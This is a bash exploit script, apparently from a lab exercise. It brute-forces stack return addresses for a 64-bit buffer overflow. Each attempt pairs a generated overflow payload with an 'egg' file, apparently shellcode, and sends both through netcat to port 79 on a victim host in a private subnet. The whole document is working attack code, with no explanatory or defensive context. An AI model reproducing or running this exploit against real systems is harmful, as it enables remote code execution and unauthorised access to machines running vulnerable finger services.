#!/bin/bash
IP="192.168.3."
trap ctrl_c INT

function ctrl_c() {
        exit 0
}

if [[ $1 == "-h" ]]; then
  echo "Usage: sploit.sh <victim #> <egg>"
fi
#For 0xffff0: 64, for 0xffff8: 72, for 0xffffc: 76
#min=140737488216064
min=140737488242976
max=140737488351232

for (( i=$min; i<=$max; i+=32 )); do
  x=`printf '%#x' $i`
  ./ovf64 168 12 $x 0
  #echo >> overflow
  cat $2 - | nc $IP$1 79
  sleep .1
done;
